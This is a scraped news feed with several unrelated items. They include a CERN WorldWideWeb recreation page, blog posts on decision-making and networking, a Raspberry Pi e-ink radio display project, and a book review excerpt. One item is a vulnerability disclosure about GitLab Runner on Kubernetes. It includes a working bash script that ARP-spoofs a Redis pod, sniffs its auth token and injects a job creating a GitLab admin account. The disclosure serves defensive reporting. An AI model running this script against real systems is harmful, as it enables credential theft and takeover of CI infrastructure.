</section>

<section>
	<h2>Linking</h2>
	<div>
		<p>At its heart, WorldWideWeb is a word processor …but with links. And just as you <em>can</em> use a word processor purely for reading documents, the real fun comes when you write your own. Especially when you throw hyperlinks into the mix.</p>
		<p>To create a document:</p>
		<ol>
			<li>From the "WorldWideWeb" menu, select "New File..."</li>
			<li>Type the name of the file you want to create e.g. example.html</li>
			<li>In the boilerplate document, click on the heading to edit. Same with the text.</li>
		</ol>
		<p>Once you've got a document written, it's time to turn from regular text into <em>hyper</em>text:</p>
		<ol>
			<li>From the "WorldWideWeb" menu, select "Links"</li>
			<li>To link to another document, you need to have that other document open in another window. Click on its title bar to focus it.</li>
			<li>With that document in focus, select "Mark all" from the "Links" menu.</li>
			<li>Now switch back to your example.html document and highlight the text you want to be a link.</li>
			<li>From the "Links" menu, select "Link to marked".</li>
		</ol>
		<p>You can even save your new document on to your hard drive. Click on "Save a copy offline" under the "Documents" menu.</p>
		<p>Once you've downloaded the file to your computer, you can open it up with a text editor to see what the HTML would have looked like.</p>
	</div>
</section>

<section>
<h2>Editing</h2>
<div>
	<p>To edit any document, whether it's one you created, or a page on the world wide web:</p>
	<ol>
		<li>Click on the text you want edit.</li>
		<li>Edit it.</li>
	</ol>
	<p>That's it.</p>
	<p>If you want to keep a copy of the edited document, choose "Save a copy offline" from the "Documents" menu.</p>
	</div>
</section>

<section>
	<h2>Components</h2>
	<p>Here is a collection of HTML-based components recreating the original NeXT interface. Feel free to grab, view-source, etc, to use for your own projects. </p>
	<section>
		<h3 id="#palette-section">Color Palette</h3>

		
	</section>

	<section>
		<h3 id="form-section">Form Elements</h3>

		<h4>Inputs</h4>
		<p><label>A label </label></p>
		<h4>Fieldsets</h4>
		
	</section>

	<section>
		<h3 id="buttons-section">Buttons</h3>
		<p>In the case of buttons, there's no standard for paddings. The button must
				match the width/height of the parent, so all buttons of the same group are of the
				same width/height.</p>

		<h4>Simple button</h4>
		
		<h4>Image Buttons</h4>
		
	</section>

	<section>
		<h3 id="panels-section">Panels</h3>
		<p>Width and height properties must be defined locally.</p>
		<div>
			<div>
				
				<p>Content goes here; it can be a webview, group of buttons, forms...</p>
			</div>

			<div>
				
				<p>Content goes here; it can be a webview, group of buttons, forms...</p>
			</div>
		</div>
	</section>

	<section>
		<h3 id="webview-section">WebView</h3>
		<p>Width and height properties must be defined locally.</p>
		<div>
			<div>
				<div>
					<div>
						<p><a href="#">Omnia sol temperat</a>
								Purus et subtilis<br>
								Novo mundo reserat<br>
								Faciem Aprilis<br>
								Ad amorem properat<br>
								Animus herilis<br>
								Et iocundis imperat<br>
								Deus puerilis<br>
								Et iocundis imperat<br>
								Deus puerilis</p>
							<p>Ama me fideliter<br>
								Fidem meam nota<br>
								De corde totaliter<br>
								Et Ex mente tota<br>
								Ama me fideliter<br>
								Fidem meam nota<br>
								De corde totaliter<br>
								Et Ex mente tota</p>

							<p>Rerum tanta novitas<br>
								In sollmenti vere<br>
								Et veris auctoritas<br>
								Iubet nos gaudere<br>
								Vices prebet solitas<br>
								Et in tuo vere<br>
								Fides est et probitas<br>
								Tuum retinere<br>
								Fides est et probitas<br>
								Tuum retinere</p>
					</div>
				</div>
				</div>
		</div>
	</section>

	<section>
		<h3 id="nav-section">Floating Menus</h3>
		
	</section>

	<section>
		<h3 id="general-section">General UI Elements</h3>
		<h4>Divisions</h4>
		
	</section>

	<section>
		<h3 id="open-url-section">Open URL</h3>
		<div>
			<div id="open-url">
				<div>
					<h3>Open using hypertext reference</h3>
					</div>
				
			</div>
		</div>
	</section>

	<section>
			<h3 id="navigation-section">Browser Navigation</h3>
			
	</section>

	<section>
			<h3 id="info-section">Info Dialog</h3>
			<div>
				<div id="browser-info">
					
					<div>
						<header>
							<p><img src="https://worldwideweb.cern.ch/images/ui-patterns/wwwicon.png" alt=""></p>
							<div>
								<h4>HyperMedia Browser/Editor</h4>
								<p>An excercise in global information availability</p>
							</div>
							<p>Version 1.0<br>Alpha only</p>
							<address>by Tim Berners-Lee</address>
						</header>
						<hr>
						<div>
							<p>Copyright 1990, 91
									<span>Distribution restricted: ask for terms.</span>
									<span>TEST VERSION ONLY</span></p>
							<dl>
								<p>
									<dt>HyperText:</dt>
									<dd>Text which is not constrained to be linear.</dd>
								</p>
								<p>
									<dt>HyperMedia:</dt>
									<dd>Information which is not constrained linear... or to be text.</dd>
								</p>
							</dl>
						</div>
						<div>
							<div>
								<div>
									<div>
									<p>This is the first version of the NextStep WorldWideWeb application
								 like the libWWW Library. <br>
								 It can pick up hypertext information from files in a number of formats, from local files, from remote files using NFS 
								 or anonymous FTP, from hypertext servers by name or keyword search, and from internet news.<br>
								 Hypertext files may be edited, and links made from hypertext files to other files or any other information.
								 <br>
								 </p><p>For more help, use "Help" from the menu. If that doesn't work, then your application has been incompletely installed.
								 </p><p>If you have any comments or have bugs, please mail timbl@info.cern.ch quoting the version number
								 (above).</p>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</section>

	<section>
		<h3 id="style-editor-section">Style Editor</h3>
		
	</section>
</section>

<!--

<section>

No images. Three levels of grey.


</section>

<section>
<img src="/images/screenshots/image2.png" alt="A style editor from the NeXT Cube computer" />
<img src="/images/screenshots/image7.png" alt="A style editor from the NeXT Cube computer" />
<img src="/images/screenshots/image11.png" alt="Document inspector from the NeXT Cube computer" />
<img src="/images/screenshots/image15.png" alt="Info Window for NeXT Cube computer's Hypermedia browser / editor with a Nexus" />
<img src="/images/screenshots/image21.png" alt="Reading news from the NeXT Cube computer's Nexus browser" />
</section>
-->


  </div></div>]]>
            </description>
            <link>https://worldwideweb.cern.ch/worldwideweb/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25013103</guid>
            <pubDate>Sat, 07 Nov 2020 03:50:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Illusion of Understanding – Know What You Don't Know (How to Bet)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25013097">thread link</a>) | @salakotolu
<br/>
November 6, 2020 | https://tolusnotes.com/how-to-bet-2/ | <a href="https://web.archive.org/web/*/https://tolusnotes.com/how-to-bet-2/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>
<main>
<article>

<div>
<figure><a href="https://tolusnotes.com/how-to-bet-1/"><div><p>Embrace Uncertainty &amp; Risk Something (How To Bet #1)</p><p>Every decision you make is a bet. Not all decisions require contemplating, but some small decisions can have huge impacts.</p><p><img src="https://tolusnotes.com/favicon.ico"><span>Tolu's Notes</span></p></div><p><img src="https://tolusnotes.com/content/images/2020/11/Blog-Post.png"></p></a></figure><p>Previously, I wrote about <a href="https://tolusnotes.com/how-to-bet-1/">embracing uncertainty</a> to make better decisions. In this post, I'll be writing about how to avoid one of the biggest pitfalls in decision making — the illusion of understanding. Knowledge (things you know) and ignorance (stuff you don't understand) contribute to your belief (what you think is true). Ignorance or the lack of information makes betting (decision making) difficult. But assuming you know when you don't know can be even more dangerous. Have you ever met someone who defended their position on an issue but couldn't explain why in detail? Stick around — this could be you.</p><figure><img src="https://tolusnotes.com/content/images/2020/11/image.png" alt="" srcset="https://tolusnotes.com/content/images/size/w600/2020/11/image.png 600w, https://tolusnotes.com/content/images/2020/11/image.png 848w" sizes="(min-width: 720px) 720px"><figcaption>University of Liverpool Study</figcaption></figure><p>Let's make this interactive. Without scrolling further, grab a piece of paper and draw a bicycle. Use the image above as a starting point. Add the frame, pedals, and chain. You get a pass if you don't know what a bicycle looks like or how they work, but I doubt anyone reading this falls into that category. If you think you know how bikes work, try to complete the challenge.</p><p>Easy right? Now bring your bicycle to life. Is it functional? The test is from a 2006 study [1]. They found that over 40% of participants drew bikes that wouldn't work in real life. These are objects most of us feel knowledgeable about. But how come we don't know how they work? This is the illusion of understanding. We think we understand things well till we have to explain them in detail.</p><h3 id="buy-this-stock">Buy This Stock</h3><p>Being a "finance guy," I'm recommended stocks to buy all the time. Mostly I listen then ignore the recommendation. But sometimes I ask why I should buy it. I usually get the same ABC is about to double because of this, this, and that. There is typically a level of certainty around the pitch — these individuals do a lot of research and have modeled ABC's success in spreadsheets. But as we get into a conversation, they figure out that there's a flaw somewhere in their belief. I wish I were impressive, but I'm not. I'm usually just standing there, letting them think out loud. But only then do they realize that they haven't thought it through.</p><p>Before I got into Decision Making (the field), I always wondered how people could go from being sure (they've usually placed their bet already) to being uncertain in a few minutes. In cases like these, it's because they learned that they didn't know as much as they thought they did. If you've ever been here, it's a good thing. Updating your beliefs after getting new information is crucial to making good decisions. What's worse is ignoring further information because it contradicts your beliefs. I'll write more about this in a future post.</p><p>A good way to avoid this pitfall is to talk to people about the decision. Write it down first, have a conversation with other people about it, then go back and read what you initially wrote. In the case of a stock, looking at the bear case as a bull is valuable. At work, asking someone else to review your work can make you better at your job. Software Engineers are familiar with this process. The worst-case scenario is that they completely agree with you. It's the worst-case because you've learned nothing new that could impact your belief. The best thing that could happen is if they provide new information that introduces things you previously didn't consider. This new information can either support or go against your belief. It can be difficult because we humans seek validation and recognition from our peers. Having someone tell you that something won't work is not great, but finding out after the fact is even worse.</p><figure><img src="https://tolusnotes.com/content/images/2020/11/image-1.png" alt="" srcset="https://tolusnotes.com/content/images/size/w600/2020/11/image-1.png 600w, https://tolusnotes.com/content/images/size/w1000/2020/11/image-1.png 1000w, https://tolusnotes.com/content/images/size/w1600/2020/11/image-1.png 1600w, https://tolusnotes.com/content/images/size/w2400/2020/11/image-1.png 2400w" sizes="(min-width: 720px) 720px"></figure><h3 id="narrative-fallacy">Narrative Fallacy</h3><p>Why did the stock market go up today? Why is it down? Why is it that the same event can be used to explain both? Take the coronavirus, for example. On a red day, headlines can say: "Stocks dip as investors worry about the rising cases of the coronavirus." It makes sense so far. If the same day is green, those same headlines could read: "Stocks jump as investors shrug off rising cases of the coronavirus." This makes no sense. If you sit and think about it, it shouldn't make sense. But our brains prefer the easy-to-understand and familiar explanation when trying to make sense of something complicated.<br></p><p>In his book, <em><a href="https://amzn.to/34XFtVo">Thinking, Fast and Slow</a></em>, Nobel Laureate Daniel Kahneman calls this associative coherence. The fast-thinking (System 1) part of our brain will substitute a difficult question with something simpler and related. It likes to keep a familiar narrative (a story). Even worse, that same part of our brain prefers these substitute conclusions whenever presented to us. The headline writers could be falling for System 1 thinking, or maybe they know that their audience will fall for it (ad revenue). It could be both — it could be a self-reinforcing loop where the writers believe what they are writing because their audience never gets tired of it.</p><p>We tend to think like those headline writers. We make sense of events by substituting them with familiar stories. It can lead us to believe that we understand the past more than we actually do. We see things that happened in the past and expect the future to be similar. But what about all the events that could have likely happened but failed to come to fruition? What about chance? Ignoring nonevents (alternate histories) lead us to believe the future will look a lot like the past because that past is all we know. But that past is just one of many.</p><figure><img src="https://tolusnotes.com/content/images/2020/11/image-2.png" alt="" srcset="https://tolusnotes.com/content/images/size/w600/2020/11/image-2.png 600w, https://tolusnotes.com/content/images/2020/11/image-2.png 960w" sizes="(min-width: 720px) 720px"><figcaption>Marvel Studios</figcaption></figure><p>If you're starting to feel like reverse Dr. Strange, well, you should. Strange reviewed all 14,000,605 futures when trying to defeat Thanos. It's funny he's played by Benedict Cumberbatch, who also depicts Sherlock Holmes — a pretty good decision-maker.</p><hr><h3 id="delve-deeper">Delve Deeper</h3><p><strong>Books</strong><br>* If you've never read <em><a href="https://amzn.to/34XFtVo">Thinking, Fast and Slow</a></em>, you should pick up a copy. Being aware of your cognitive biases will make you a better decision-maker.<br>* If you want to understand why stories are so important to us humans, read <a href="https://amzn.to/2TTwqPh">Sapiens: A Brief History of Humankind</a> by historian Yuval Noah Harari.<br>* <a href="https://amzn.to/3mVuRg3">Mastermind: How to Think Like Sherlock Holmes</a> by Maria Konnikova, a professional poker player, is also a good read.</p><p><strong>Sources</strong><br>[1] - <a href="https://www.liverpool.ac.uk/~rlawson/PDF_Files/L-M&amp;C-2006.pdf">https://www.liverpool.ac.uk/~rlawson/PDF_Files/L-M&amp;C-2006.pdf</a></p><hr><p>Did you draw the bike? Could you share it with me? It can't be worse than what the participants in the study came up with.</p><figure><img src="https://tolusnotes.com/content/images/2020/11/image-3.png" alt="" srcset="https://tolusnotes.com/content/images/size/w600/2020/11/image-3.png 600w, https://tolusnotes.com/content/images/size/w1000/2020/11/image-3.png 1000w, https://tolusnotes.com/content/images/size/w1600/2020/11/image-3.png 1600w, https://tolusnotes.com/content/images/2020/11/image-3.png 1692w" sizes="(min-width: 720px) 720px"><figcaption>University of Liverpool Study</figcaption></figure><hr><p>
<sub>🎙️ Business and Investing Podcast: <a href="https://bit.ly/tolusnotes-youtube">YouTube</a> | <a href="https://bit.ly/tolusnotes-podcast">Audio Sources</a></sub><br>
<sub>📚 Currently reading <a href="https://amzn.to/34HAp7E">Black Swan - Nassim Taleb</a> (Lately I've been doing more writing than reading)</sub><br>
<sub>❤️ Support my writing by forwarding it to a friend or family</sub><br>
<sub>👊 If this was forwarded to you, subscribe <a href="https://tolusnotes.com/signup/">here</a> for future notes</sub><br>
<sub>✉️ Thanks for reading. Let me know what you think of it at <a href="https://tolusnotes.com/cdn-cgi/l/email-protection" data-cfemail="bfd1dac8ccd3dacbcbdacdffcbd0d3caccd1d0cbdacc91dcd0d2">[email&nbsp;protected]</a></sub><br>
</p><p><sup>All content provided on this blog is for educational purposes only and should not be taken as personalized investment or tax advice, not as an indication to buy or sell certain securities. The owner of this blog makes no representations as to the accuracy or completeness of any information on this site or found by following any link on this site. The owner will not be liable for any errors or omissions in this information nor for the availability of this information. The owner will not be liable for any losses, injuries, or damages from the display or use of this information.</sup></p>

<section>
<h2>Enjoying these posts? Subscribe for more</h2>

<br>

</section>
</div>

</article> 
</main>
</div>
</div></div>]]>
            </description>
            <link>https://tolusnotes.com/how-to-bet-2/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25013097</guid>
            <pubDate>Sat, 07 Nov 2020 03:48:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Use a Conversational Hook When Networking with Strangers]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25012993">thread link</a>) | @mooreds
<br/>
November 6, 2020 | https://letterstoanewdeveloper.com/2019/02/25/use-a-conversational-hook-when-networking-with-strangers/ | <a href="https://web.archive.org/web/*/https://letterstoanewdeveloper.com/2019/02/25/use-a-conversational-hook-when-networking-with-strangers/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-136">
			<!-- .entry-header -->		<!-- .entry-meta -->
	
	<div>
		<p>Dear new developer,</p>
<p>Work on your network. It will help you in numerous ways as you progress in your career. Whatever you are looking for: a new job, to hire someone, to get a mentor, to learn about a new technology, having a list of people that you know and/or have worked with that you can reach out to will help you accomplish your goals.</p>
<p>But it can be tough, especially if you are awkward around people. I am awkward around people and learned how to be less awkward. My main technique is to both give and ask for a “hook” in any conversation I start.</p>
<p>Here’s a typical “networking” conversation of which I’ve had many:</p>
<p>Dan: Hi, I’m Dan.</p>
<p>Jan: Hi, I’m Jan.</p>
<p>Dan: Where do you work?</p>
<p>Jan: I work at Company X. Where do you work?</p>
<p>Dan: Company Y.</p>
<p>&lt;crickets&gt;</p>
<p>Compare that with this conversation:</p>
<p>Dan: Hi, I’m Dan.</p>
<p>Jan: Hi, I’m Jan.</p>
<p>Dan: Where do you work?</p>
<p>Jan: I work at Company X. Where do you work?</p>
<p>Dan: Company Y. We recently launched website Z and are evaluating technology ABC. What has your company recently rolled out?</p>
<p>See the difference? Dan has provided Jan with two avenues for conversation–one is asking further about technology ABC or website Z, and the other is talking about Company X. Jan can decide where to take the conversation, but Dan has provided the start of it.</p>
<p>Learning this trick, which comes naturally to many many people, changed the way I network. Another thing that mattered was my realization that everyone, every single person, has an interesting story or anecdote to tell, and that I can learn something. That understanding has made conversation much more fun.</p>
<p>Sincerely,</p>
<p>Dan</p>

	</div><!-- .entry-content -->

	<!-- .entry-footer -->

	<div>
			<!-- .entry-auhtor -->
		<p><strong>Published</strong>
			<time datetime="2019-02-25T12:04:06-07:00">February 25, 2019</time><time datetime="2019-02-03T12:04:26-07:00">February 3, 2019</time>		</p><!-- .site-posted-on -->
	</div>
</article></div>]]>
            </description>
            <link>https://letterstoanewdeveloper.com/2019/02/25/use-a-conversational-hook-when-networking-with-strangers/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25012993</guid>
            <pubDate>Sat, 07 Nov 2020 03:14:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Arpspoof vs. Kubernetes]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25012918">thread link</a>) | @caseyjohnellis
<br/>
November 6, 2020 | https://community.disclose.io/t/arpspoof-vs-kubernetes/81 | <a href="https://web.archive.org/web/*/https://community.disclose.io/t/arpspoof-vs-kubernetes/81">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
<p><a href="https://gitlab.com/gitlab-org/gitlab-runner/-/issues/26833" rel="noopener nofollow ugc">Original issue at GitLab</a></p>
<h2>Summary</h2>
<p>The Kubernetes Executor executes jobs on pods with the default security context, which allows <code>CAP_NET_RAW</code>. This allows for malicious workloads to use arpspoofing and other methods to attack any other workload running on the same node.</p>
<p>As a proof of content, the default installation of the GitLab Helm chart bundles GitLab runner and deploys the Runner into the same cluster alongside the GitLab instance. This opens various attack paths from CI Jobs towards the GitLab instance, including the ability to get admin control over the instance.</p>
<h2>Steps to reproduce</h2>
<p>A very basic example would be the following shell script:</p>
<pre><code>#!/bin/bash
apt-get update
apt-get install -y git python python-scapy tcpdump dnsutils dsniff nmap psmisc arping binutils grep netcat
GWIP=`ip route |grep default | cut -f 3 -d " "`
REDISIP=`host gitlab-redis-master-0.gitlab-redis-headless.default.svc.cluster.local | cut -f 4 -d " "`
arping gitlab-redis-master-0.gitlab-redis-headless.default.svc.cluster.local -c 3 || exit  # wrong subnet
tcpdump -ni eth0 -s 0 -w out.pcap &amp;
arpspoof -r -t $REDISIP $GWIP &amp; &gt; /dev/null 2&gt;&amp;1 
sleep 3
tcpkill -9 port 6379 &amp; sleep 5 &amp;&amp; killall -9 tcpkill
sleep 10 
killall tcpdump
killall -9 arpspoof
REDISTOKEN=`strings out.pcap |grep '^auth$' -A 1  | grep '[a-zA-Z0-9]\{64\}' | head -n 1`
nc $REDISIP 6379 &lt;&lt;EOE
auth $REDISTOKEN
multi
sadd resque:gitlab:queues system_hook_push
lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"User.new(name: 'haxx',admin: true,password: 'haxx1234%A',username: 'haxx', email: '<a href="https://community.disclose.io/cdn-cgi/l/email-protection" data-cfemail="5f373e1f2727713631293e33363b">[email&nbsp;protected]</a>',admin: true).save\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"4552c3b1225428b18682c901\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
exec
EOE
exit 0
</code></pre>
<p>The script will interfere with the <code>redis</code> instance on network level using <code>arpspoof</code> and <code>tcpkill</code> to sniff the <code>redis</code> authentication token. Subsequently the script will create an admin account via injection of a <code>GitlabShellWorker</code> job.</p>
<p>I could run this script and sucessfully create the admin account from a CI job in a test installation of the GitLab Helm chart. The installation was performed using</p>
<pre><code>helm  upgrade --install gitlab  gitlab/gitlab \                                     
  --timeout 600s \
--set global.hosts.domain=k8s.thetanuki.io \
--set <a href="https://community.disclose.io/cdn-cgi/l/email-protection" data-cfemail="63000611170e020d020406114e0a10101606114d060e020a0f5e0910000b0d060614060a101923040a170f02014d000c0e">[email&nbsp;protected]</a> \
--set global.hosts.externalIP=34.107.49.76
</code></pre>
<p>Note: Due to the network segmentation the CI job needed to be started several times to eventually end up in the same network segment where the <code>redis</code> pod lives this is required for the ARP spoofing attack to be performed.</p>
<p>This is just one of many possible attacks, other vectors might target the <code>Gitaly</code> or <code>Gitlab Shell</code> tokens or even sniff passwords for the Web login.</p>
</div></div>]]>
            </description>
            <link>https://community.disclose.io/t/arpspoof-vs-kubernetes/81</link>
            <guid isPermaLink="false">hacker-news-small-sites-25012918</guid>
            <pubDate>Sat, 07 Nov 2020 02:54:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Is this Mahler? This sounds like Mahler]]>
            </title>
            <description>
<![CDATA[
Score 272 | Comments 34 (<a href="https://news.ycombinator.com/item?id=25012900">thread link</a>) | @luu
<br/>
November 6, 2020 | http://sarabee.github.io/2020/09/13/is-this-mahler/ | <a href="https://web.archive.org/web/*/http://sarabee.github.io/2020/09/13/is-this-mahler/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img src="http://sarabee.github.io/images/whatnow-crop.jpg" width="180">
One of the most delightful parts of being a software engineer and hardware
tinkerer is having the ability to solve my own specific (and often niche)
problems. In this post, the particular problem I’ll be solving is the burning
need to know what is currently playing on <a href="https://www.wqxr.org/">WQXR</a>, NYC’s classical radio station.</p>

<p>A typical Saturday for me looks like this: I wake up and make a coffee, bring
it to the couch in the living room, pick up my knitting, and turn on the radio. Maybe midway through the morning
a halfway-familiar piece comes on, but I’ve left my phone in the other room and won’t be
able to go check the WQXR website without disentangling myself from my
knitting and missing a bit of the piece that has captured my attention.</p>

<p>Or how about a weekday: I’m working on a project, elbows deep in the code, with the WQXR livestream open in one of my million
browser tabs. I feel a glimmer of recognition, but I’m fully focused on my
work and don’t want to break my concentration to go hunt down the livestream
player and find out what it is.</p>

<p>To solve this particular problem, I needed two things: a way to find out what
was on the radio, and a place to display it.</p>

<p>There are a couple of different ways you could find out what’s playing,
including music identification services like Shazam. But those rely on already
having a recording in their database to match against, and I’m listening to
classical music where I could be hearing any one of dozens of different
recordings (and even live performances) for any given piece, making it
unlikely that such a service would be able to find a match. So I started with
the source I was already using to get this information: the WQXR website.</p>

<p>If you leave the website open long enough, you’ll notice that it automatically
updates to reflect what’s currently playing. This was great news for me,
because it meant that somewhere in the page a script is periodically making
ajax requests to get that information, requests that I could also make myself.
To find out what these requests were, I eavesdropped on my browser’s network
calls using the developer console.</p>

<p><img src="http://sarabee.github.io/images/wqxr-network.jpg" width="500"></p>

<p>There are two calls being made here, one to an endpoint called streams,
and one to something very promisingly named <code>whats_on</code>. Making a request to
that second endpoint, we get a beautiful json response containing information
about what’s playing on New York Public Radio’s various livestreams. Great!
This is exactly what I need to satisfy the first piece of this project.</p>

<p>(I honestly can’t remember how I figured this out, but you can append the call
letters for the particular station you’re interested in to the URI to just get
information for that stream, but the full response would also have worked just
fine.)</p>

<p>Okay, cool, so I have the data. How do I get this information in front of my
eyeballs when I’m listening to the radio?</p>

<p>You already know from the teaser photo at the top of the post that
I ultimately put it on my mantel, but I took an iterative approach to getting
there.</p>

<p>I use tmux to manage my terminal sessions, and it occurred to me that the
status bar, always there along the bottom of my terminal, might be a nice
place to have information about what’s currently playing. I wrote some
lightweight python classes for fetching and parsing the radio’s API response,
and a tiny script, <code>tmux.py</code> that outputs the information in the format I want for this
purpose.</p>

<p>Adding something to the tmux status bar is just a matter of adding a couple of
lines to <code>.tmux.conf</code>:</p>

<figure><pre><code data-lang="bash"><span>set</span> <span>-g</span> status-right-length 200
<span>set</span> <span>-g</span> status-right <span>'#[bg=#d7ff5f] #(python3
/home/sarabee/development/nowplaying/tmux.py)  |  [%H:%M] '</span></code></pre></figure>

<p>This overwrote the clock that was there by default, so I added one back in. By
default, scripts run in <code>.tmux.conf</code> are executed once every 15 seconds, which
was more than fast enough for my purpose. My status bar then looks like this:</p>

<p><img src="http://sarabee.github.io/images/now-playing.jpg"></p>

<p>This fixed the problem of not wanting to leave my terminal to find out what
I’m listening to, but what about when I’m in the living room? I knew I wanted
a display, that I wanted it to update automatically, like the tmux status bar,
that I wanted it to be constantly running, like an indoor thermometer readout,
and that I wanted it to be readable from any position in the room, with good
view angles and readability under a variety of lighting conditions.  This all
sounded to me like the <em>perfect</em> excuse to work with e-paper.</p>

<p><a href="http://shop.pimoroni.com/">Pimoroni</a> was having a sale, so I picked up two e-ink displays: the smaller inkypHAT, and the
larger inkywHAT. I also got a couple of Raspberry Pi Zero Ws to pop them on
top of (quick aside: these things cost $10 and have wifi and bluetooth, wowww).</p>

<p>Starting with the inkypHAT and the code I’d already written for handling radio
data, I prototyped my idea, creating a tiny display that sits on top of my
monitor. I set the Pi Zeroes up the way I set up my larger Raspberry Pi 3,
with Raspbian Lite. Without worrying too much about styling the display
aesthetically, I learned how to work with the
<a href="https://github.com/pimoroni/inky">Inky</a> and
<a href="https://pillow.readthedocs.io/en/stable/">Pillow</a> libraries and
wrote a script to get the composer and title chopped up to fit across multiple
lines on the screen:</p>

<p><img src="http://sarabee.github.io/images/wqxr-phat.jpg" width="500"></p>

<p>I have it running once a minute on a cron, and to avoid refreshing the e-ink
display unnecessarily, I keep the last piece written to the display in memory and
update only if I’ve gotten something new back from WQXR.</p>

<p>Reworking this script for the larger inkywHAT display wasn’t difficult; it
mostly involved tweaking font size to take advantage of the larger screen. But
since this is meant to live on my mantel and be highly visible in my living
room, I wanted to make it look a bit nicer than just throwing the text on
there. I found a clip-art scrollwork frame, and using only the MacOS Preview
app and ImageMagick, got it into the right size and format
for the e-ink display.</p>

<p>In Preview, I grabbed a corner of the frame and pasted it in again three more
times, rotated 90 degrees each time, and carefully bumped each corner around
until they were lined up and could be scaled down reasonably to the right
dimensions (400x300px). Even though the image appeared to be entirely black
and white, a closer look shows this wasn’t true at all! It’s actually full of
many different shades of gray:</p>

<p><img src="http://sarabee.github.io/images/whatnow-corner.png" width="300"></p>

<p>To get the image into the right format and flatten it down to just two colors,
I used the <a href="https://imagemagick.org/script/command-line-processing.php">ImageMagick command-line
tools</a>. While <a href="http://www.imagemagick.org/Usage/quantize/#two_color">this
extremely thorough page</a> in the IM docs goes pretty far in-depth with the
various ways you can convert an image to black and white, I ultimately ended
up going with:</p>

<figure><pre><code data-lang="bash">magick input.png <span>-colorspace</span> gray <span>-colors</span> 2 <span>-normalize</span> PNG8:output.png</code></pre></figure>

<p>Which produces a frame that looks like this:</p>

<p><img src="http://sarabee.github.io/images/whatnow-frame.png"></p>

<p>It’s a little rough when you see it on a relatively high resolution monitor, but looks great on the 400x300 e-ink
display! After that, adding the text was pretty straightforward;
earlier when only displaying text, I was still actually using Pillow to create an empty
image in the correct dimensions that I drew the text onto:</p>

<figure><pre><code data-lang="python"><span>img</span> <span>=</span> <span>Image</span><span>.</span><span>new</span><span>(</span><span>"P"</span><span>,</span> <span>(</span><span>inky_display</span><span>.</span><span>WIDTH</span><span>,</span> <span>inky_display</span><span>.</span><span>HEIGHT</span><span>))</span></code></pre></figure>

<p>To use the frame, I simply started with the frame image instead:</p>

<figure><pre><code data-lang="python"><span>img</span> <span>=</span> <span>Image</span><span>.</span><span>open</span><span>(</span><span>os</span><span>.</span><span>path</span><span>.</span><span>join</span><span>(</span><span>current_dir</span><span>,</span>
<span>"whatnow.png"</span><span>)).</span><span>resize</span><span>(</span><span>inky_display</span><span>.</span><span>resolution</span><span>)</span></code></pre></figure>

<p>The last little bit of clean-up work involved getting the text centered in the
frame, and setting the margins in my script so that the line breaks were
a comfortable distance from its edges.</p>

<p><img src="http://sarabee.github.io/images/whatnow-closeup.jpg" width="500"></p>

<p>I’m happy with where this project is at; the text is clear and legible from
anywhere in my living room, and my Saturday morning listening experience has
been greatly improved. Eventually, it’ll get custom wooden housing, which will
be its own post, I’m sure! Feel free to dig around in <a href="https://github.com/SaraBee/nowplaying">the project’s repo on
GitHub</a> to get an even better idea of how this all works.</p>
</div></div>]]>
            </description>
            <link>http://sarabee.github.io/2020/09/13/is-this-mahler/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25012900</guid>
            <pubDate>Sat, 07 Nov 2020 02:49:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Book Review: Working in Public by Nadia Eghbal]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25012849">thread link</a>) | @pabs3
<br/>
November 6, 2020 | https://veronneau.org/book-review-working-in-public-by-nadia-eghbal.html | <a href="https://web.archive.org/web/*/https://veronneau.org/book-review-working-in-public-by-nadia-eghbal.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="article">
    <p>I have a lot of respect for Nadia Eghbal, partly because I can't help to be
jealous of her work on the economics of Free Software<sup id="fnref:os"><a href="#fn:os" rel="footnote">1</a></sup>. If you are not
already familiar with Eghbal, she is the author of <a href="https://www.fordfoundation.org/about/library/reports-and-studies/roads-and-bridges-the-unseen-labor-behind-our-digital-infrastructure/"><em>Roads and Bridges: The
Unseen Labor Behind Our Digital Infrastructure</em></a>, a great technical
report published for the Ford Foundation in 2016. You may also have caught her
<a href="https://www.youtube.com/watch?v=W2AR1owg0ao">excellent keynote</a> at LCA 2017, entitled <em>Consider the Maintainer</em>.</p>
<p>Her latest book, <em>Working in Public: The Making and Maintenance of Open Source
Software</em>, published by Stripe Press a few months ago, is a great read and if
this topic interests you, I highly recommend it.</p>
<p>The book itself is simply gorgeous; bright orange, textured hardcover binding,
thick paper, wonderful typesetting — it has everything to please. Well, nearly
everything. Sadly, it is only available on Amazon, exclusively in the United
States. A real let down for a book on Free and Open Source Software.</p>
<p>The book is divided in five chapters, namely:</p>
<ol>
<li>Github as a Platform</li>
<li>The Structure of an Open Source Project</li>
<li>Roles, Incentives and Relationships</li>
<li>The Work Required by Software</li>
<li>Managing the Costs of Production</li>
</ol>
